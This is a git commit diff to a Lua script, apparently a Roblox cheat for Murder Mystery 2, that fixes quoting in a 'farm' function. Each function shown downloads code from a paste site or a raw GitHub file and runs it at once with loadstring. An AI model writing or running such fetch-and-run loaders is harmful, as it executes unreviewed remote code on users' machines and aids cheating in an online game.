d3c3841b224e42fcfee9bbb4533be4a9fd231dc5
leonix <furkan62.bakir@gmail.com>
2025-10-27 21:48:57 +0300

    Fix loadstring syntax in farm function

--- most.lua
+++ most.lua
@@ -1,5 +1,5 @@
 local function farm()
-    loadstring(game:HttpGet('https://paste.debian.net/plainh/74bf5c65/", true))()
+    loadstring(game:HttpGet("https://paste.debian.net/plainh/74bf5c65/", true))()
 end
 local function loadui()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua'))()
